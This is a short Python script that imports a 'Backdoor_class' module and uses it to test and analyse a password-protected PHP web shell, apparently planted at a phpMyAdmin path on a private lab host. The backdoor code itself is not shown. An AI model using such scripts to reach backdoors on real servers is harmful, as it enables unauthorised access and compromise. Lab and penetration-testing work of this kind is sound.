import Backdoor_class
a = Backdoor_class.Backdoor()
a.testUrl("http://192.168.10.128/phpMyAdmin/js/config/two.php?pass=admin",
          password="admin")
a.analyzeUrl()
a.printAll()
